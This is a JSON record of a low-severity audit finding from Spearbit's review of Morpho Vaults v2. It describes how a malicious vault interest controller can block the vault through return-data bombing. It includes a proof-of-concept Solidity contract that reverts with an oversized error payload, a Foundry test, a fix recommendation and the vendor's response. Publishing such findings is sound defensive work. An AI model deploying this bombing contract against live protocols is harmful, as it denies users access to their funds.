@@ -1,0 +1,60 @@
+{
+    "id": 62923,
+    "kind": "PDF",
+    "auditfirm_id": 6,
+    "impact": "LOW",
+    "finders_count": 4,
+    "protocol_id": 3462,
+    "title": "A broken or malicious vault interest controller can DoS the vault",
+    "content": "## Severity: Low Risk\n\n## Context\nVaultV2.sol#L429-L430\n\n## Description\nIt is very unlikely but a broken or malicious Ivic can DoS the vault by return-data bombing.\n\n## Proof of Concept\nApply the following patch:\n\n```diff\ndiff --git a/test/AccrueInterestTest.sol b/test/AccrueInterestTest.sol\nindex 983da9f..fbd8ccf 100644\n--- a/test/AccrueInterestTest.sol\n+++ b/test/AccrueInterestTest.sol\n@@ -3,6 +3,62 @@ pragma solidity ^0.8.0;\n import \"./BaseTest.sol\";\n+ contract BadVic {\n+\n+ uint256 internal constant FREE_MEM_PTR = 0x40;\n+ uint256 internal constant WORD_SIZE = 32;\n+ uint256 internal constant ERROR_STRING_SELECTOR = 0x08c379a0; // Error(string)\n+\n+ function _sqrt(uint256 x) internal pure returns (uint256 z) {\n+ /// @solidity memory-safe-assembly\n+ assembly {\n+ z := 181 // The \"correct\" value is 1, but this saves a multiplication later.\n+\n+ let r := shl(7, lt(0xffffffffffffffffffffffffffffffffff, x))\n+ r := or(r, shl(6, lt(0xffffffffffffffffff, shr(r, x))))\n+ r := or(r, shl(5, lt(0xffffffffff, shr(r, x))))\n+ r := or(r, shl(4, lt(0xffffff, shr(r, x))))\n+ z := shl(shr(1, r), z)\n+\n+ z := shr(1, add(z, div(x, z)))\n+ z := shr(1, add(z, div(x, z)))\n+ z := shr(1, add(z, div(x, z)))\n+ z := shr(1, add(z, div(x, z)))\n+ z := shr(1, add(z, div(x, z)))\n+ z := shr(1, add(z, div(x, z)))\n+ z := shr(1, add(z, div(x, z)))\n+ z := sub(z, lt(div(x, z), z))\n+ }\n+ }\n+\n+ /// calculate the memory size in words required to trigger a given memory expansion cost\n+ function calculateMemorySizeWord(uint memory_cost) public pure returns (uint memory_size_word) {\n+ // Constants for the quadratic equation\n+ uint a = 1;\n+ uint b = 1536; // 3 * 512\n+ uint c = 512 * memory_cost;\n+\n+ // Calculate the discriminant\n+ uint discriminant = b**2 + 4 * a * c;\n+\n+ // Calculate the positive root using the quadratic formula\n+ memory_size_word = _sqrt(discriminant) / (2 * a) - b;\n+ }\n+ function interestPerSecond(uint256, uint256) external view {\n+ uint256 bomb_length = calculateMemorySizeWord(gasleft() * 9 / 10) * WORD_SIZE;\n+ uint256 payload_length = 4 + 2 * WORD_SIZE + bomb_length;\n+\n+ assembly {\n+ let ptr := mload(FREE_MEM_PTR)\n+ mstore(ptr, shl(224, ERROR_STRING_SELECTOR))\n+ mstore(add(ptr, 0x04), WORD_SIZE) // String offset\n+ mstore(add(ptr, 0x24), bomb_length) // String length\n+ mstore(add(ptr, 0x44), \"BOMB!\")\n+ revert(ptr, payload_length)\n+ }\n+ }\n+ }\n+\n contract AccrueInterestTest is BaseTest {\n using MathLib for uint256;\n@@ -166,6 +222,23 @@ contract AccrueInterestTest is BaseTest {\n assertEq(vault.totalAssets(), totalAssetsBefore);\n }\n+ function testAccrueInterestVicChangingState() public {\n+ uint256 elapsed = 10 weeks;\n+\n+ address badVic = address(new BadVic());\n+\n+ // Setup.\n+ vm.prank(curator);\n+ vault.submit(abi.encodeCall(IVaultV2.setVic, (badVic)));\n+ vault.setVic(badVic);\n+ vm.warp(vm.getBlockTimestamp() + elapsed);\n+\n+ // Vic reverts.\n+ uint256 totalAssetsBefore = vault.totalAssets();\n+ vault.accrueInterest();\n+ assertEq(vault.totalAssets(), totalAssetsBefore);\n+ }\n+\n function testPerformanceFeeWithoutManagementFee(\n uint256 performanceFee,\n uint256 interestPerSecond,\n```\n\nand run:\n```sh\nforge test -vvvv --mt testAccrueInterestVicBomb\n```\n\nThe bombing implementation is taken from `66_returnbomb.t.sol`.\n\n## Recommendation\nUse low-level assembly block to perform the `staticcall` and decode the return data or use libraries like `ExcessivelySafeCall`.\n\nThere are also 3 `token.calls` in `SafeERC20Lib.sol#L7-L31` which could benefit from the above suggestion but currently do not have the same risk since it would mean that either:\n- In the Vault the immutable asset or...\n- The vault in the adapters.\nwould be a broken contract.\n\n## Morpho\nBecause of the try-catch gas bug, we decided that it was better if the VIC was handled as a trusted component for the liveness.\n\n## Spearbit\nThe issue is not relevant anymore since the VIC is considered a trusted component for the vault and documented in PR 579.",
+    "summary": "",
+    "report_date": "2025-10-13T00:00:00.000Z",
+    "contest_prize_txt": "",
+    "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Vaults-v2-Spearbit-Security-Review-May-2025.pdf",
+    "sponsor_name": null,
+    "sponsor_link": "",
+    "quality_score": 0,
+    "general_score": 0,
+    "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Vaults-v2-Spearbit-Security-Review-May-2025.pdf",
+    "github_link": "",
+    "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Morpho-Vaults-v2-Spearbit-Security-Review-May-2025.pdf",
+    "pdf_page_from": 27,
+    "contest_id": "",
+    "slug": "a-broken-or-malicious-vault-interest-controller-can-dos-the-vault-spearbit-none-morpho-vaults-v2-pdf",
+    "firm_name": "Spearbit",
+    "firm_logo_square": "spearbit_square.png",
+    "protocol_name": "Morpho Vaults v2",
+    "bookmarked": false,
+    "read": false,
+    "issues_issue_finders": [
+        {
+            "wardens_warden": {
+                "handle": "Saw-mon and Natalie"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Om Parikh"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Jonatas Martins"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Emmanuele Ricci"
+            }
+        }
+    ],
+    "auditfirms_auditfirm": {
+        "name": "Spearbit",
+        "logo_square": "spearbit_square.png"
+    },
+    "protocols_protocol": {
+        "name": "Morpho Vaults v2",
+        "protocols_protocolcategoryscore": []
+    },
+    "issues_issuetagscore": []
+}
